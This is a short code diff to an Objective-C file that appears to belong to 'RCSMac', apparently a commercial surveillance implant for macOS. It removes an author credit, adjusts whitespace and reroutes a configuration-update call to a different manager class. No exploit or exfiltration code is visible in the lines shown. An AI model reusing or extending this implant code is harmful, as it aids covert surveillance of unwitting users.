@@ -2,7 +2,7 @@
  * RCSMac - ConfigurationUpdate Network Operation
  *
  *
- * Created by revenge on 12/01/2011
+ * Created on 12/01/2011
  * Copyright (C) HT srl 2011. All rights reserved
  *
  */
@@ -27,7 +27,7 @@
   if ((self = [super init]))
     {
       mTransport = aTransport;
-      
+    
 #ifdef DEBUG_CONF_NOP
       infoLog(@"mTransport: %@", mTransport);
 #endif
@@ -174,10 +174,7 @@
       return NO;
     }
   
-  // Store new configuration file
-  RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
-  
-  if ([taskManager updateConfiguration: configData] == FALSE)
+  if ([[RCSIConfManager sharedInstance] updateConfiguration: configData] == FALSE)
     {  
       [configData release];
       [infoManager release];
